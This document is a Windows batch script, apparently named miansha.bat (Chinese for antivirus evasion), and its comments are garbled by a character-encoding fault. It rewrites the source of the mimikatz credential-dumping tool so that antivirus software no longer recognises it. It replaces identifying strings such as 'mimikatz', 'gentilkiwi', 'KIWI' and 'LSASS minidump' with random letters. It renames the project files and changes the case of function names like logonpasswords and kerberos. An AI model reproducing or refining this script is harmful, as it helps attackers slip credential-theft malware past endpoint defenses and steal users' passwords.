@echo off
:: ����ַ�
setlocal enabledelayedexpansion

set _out=

rem mimikatz�ļ�����
call :RandomStr 5
tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat "mimikatz" . | tools\xargs tools\sed -b -i "s/mimikatz/!_out!/g"
tools\mv ./mimikatz/mimikatz.h ./mimikatz/!_out!.h
tools\mv ./mimikatz/mimikatz.c ./mimikatz/!_out!.c
tools\mv ./mimikatz/mimikatz.ico ./mimikatz/!_out!.ico
tools\mv ./mimikatz/mimikatz.rc ./mimikatz/!_out!.rc
tools\mv ./mimikatz/mimikatz.vcxproj ./mimikatz/!_out!.vcxproj
tools\mv ./mimikatz/mimikatz.vcxproj.filters ./mimikatz/!_out!.vcxproj.filters
tools\mv ./mimikatz !_out!

echo ������Ҫ�������ļ���
for %%a in (_m_) do (
    call :RandomStr 5
    call :FileRC %%a !_out!
    echo,!_out!
    call :FileRen %%a !_out!
)

echo ������Ҫ�������ļ���
for %%a in (gentilkiwi MIMIKATZ KIWI oe.eo Vincent MINIDUMP L_M_ creativecommons) do (
    call :RandomStr 5
    call :FileRC %%a !_out!
)

call :RandomStr 5
tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "LSASS minidump" . | tools\xargs tools\sed -b -i "s/LSASS minidump/!_out!/g"

tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "  * " . | tools\xargs tools\sed -b -i "s/  * /  * * /g"

@rem �޸�����
tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "  * * PUSER_SESSION_KEY;" . | tools\xargs tools\sed -b -i "s/  * * PUSER_SESSION_KEY;/  * PUSER_SESSION_KEY;/g"

call :FileRC minidump MiNidump
call :FileRC logonpasswords logonPasswords
call :FileRC PRINT_ERROR PRIN_ERROR
call :FileRC kprintf kPRintf
call :FileRC kerberos kerBeros
call :FileRC process Process

:: =================
:: ��������ַ���
:: =================
::
:RandomStr <int>
    set d_len=%1
    set d_StrList=QWERTYUIOPASDFGHJKLZXCVBNM

    set len=%d_len%
    @rem ���"��С�ַ�����-����ַ�����"
    for /f "tokens=1,2 delims=- " %%a in ("%len%") do (
            set /a min_len = %%a, max_len = %%a+3
            set /a "len = %random% %% (max_len-min_len+1) + min_len"
    )

    @rem ############## ��ȡ�ַ���
    set StrList=%d_StrList%

    @rem ############## �����ַ�������
    call :StrLen "%StrList%"


    set _out=
    for /l %%n in (1 1 %len%) do (
            set /a pos = !random! %% StrLen
            for %%p in (!pos!) do set _out=!_out!!StrList:~%%p,1!
    )
goto:eof

:: =================
:: �����ַ�������
:: =================
::
:StrLen <string>
    set "_StrList=%~1"
    set StrLen=1
    for %%a in (2048 1024 512 256 128 64 32 16) do (
            if "!_StrList:~%%a!" neq "" (
                    set /a StrLen += %%a
                    set _StrList=!_StrList:~%%a!
            )
    )
    set _StrList=!_StrList!fedcba9876543210
    set /a StrLen += 0x!_StrList:~16,1!
goto:eof

:: =================
:: �ļ�/·��������
:: =================
::
:FileRen <string> <string>
    set str_1=%1
    set str_2=%2

    for /f %%i in ('dir /s /b *%str_1%*.c *%str_1%*.h') do (
        set _var=%%i
        if not !_var!.==. (
            set "_var=!_var:%str_1%=%str_2%!"
            tools\mv %%i !_var!
        )
    )
goto:eof


:: =================
:: �ı������滻
:: =================
::
:FileRC <string> <string>
    set str_1=%1
    set str_2=%2
    tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "%str_1%" . | tools\xargs tools\sed -b -i "s/%str_1%/%str_2%/g"
goto:eof